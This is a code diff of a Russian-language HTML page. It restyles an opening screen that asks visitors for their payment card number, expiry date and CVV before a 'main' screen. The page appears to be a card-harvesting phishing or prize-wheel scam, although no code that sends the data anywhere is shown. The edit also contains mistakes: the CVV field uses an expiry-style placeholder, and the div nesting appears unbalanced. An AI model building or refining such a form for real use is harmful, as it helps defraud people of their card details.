@@ -46,12 +46,28 @@ transition:transform 5s cubic-bezier(.17,.67,.15,1)}
 
 <div id="start" class="screen">
 <div class="card">
-<h2>Введите информацию с оборота вашей карты</h2>
-<input id="a1" placeholder="Введите номер карты:">
-<input id="a2" placeholder="Введите дату истечения срока карты:">
-<input id="a3" placeholder="введите свв код:">
-<button id="go">Продолжить</button>
+<h2>Введите информацию с вашей карты</h2>
+<div class="form-row">
+    <label for="a1">Номер карты:</label>
+    <input id="a1" type="text" inputmode="numeric">
 </div>
+
+<div class="form-row">
+    <label for="a2">Дата истечения срока карты:</label>
+    <input id="a2" type="text" inputmode="numeric">
+</div>
+
+<div class="form-row">
+    <label for="a3">СВВ код:</label>
+
+    <div class="country-input">
+        <input
+            id="a3"
+            type="text"
+            maxlength="5"
+            placeholder="00/00"
+        >
+    </div>
 </div>
 
 <div id="main" class="screen">
